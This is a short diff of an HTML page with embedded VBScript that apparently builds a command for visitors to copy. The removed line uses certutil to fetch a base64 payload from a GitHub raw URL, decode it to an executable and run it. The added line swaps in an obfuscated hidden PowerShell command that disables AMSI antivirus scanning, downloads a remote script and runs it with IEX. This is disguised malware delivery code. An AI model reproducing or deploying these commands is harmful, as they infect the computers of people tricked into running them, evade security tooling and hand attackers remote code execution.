@@ -14,7 +14,7 @@ p{font-size:15px;color:#5f6368;max-width:520px;margin:12px auto;line-height:1.5}
 <script language="VBScript">
 On Error Resume Next
 Dim cmd
-cmd = "certutil -urlcache -split -f https://raw.githubusercontent.com/kai195102/d/main/rs.b64 %temp%\r.b64 & certutil -decode %temp%\r.b64 %temp%\r.exe & %temp%\r.exe"
+cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$a=[Ref].Assembly.GetType(('Sys'+'tem.Man'+'agement.Aut'+'omation.Amsi'+'Utils'));$b=$a.GetField(('amsiInitF'+'ailed'),'NonPublic,Static');$b.SetValue($null,$true);$c=New-Object Net.WebClient;$d=$c.DownloadString(('https://raw.githubusercontent.com/kai195102/d/main/f.ps1'));IEX $d"""
 Sub copyCmd
   Dim el
   Set el = document.getElementById("cmdBox")
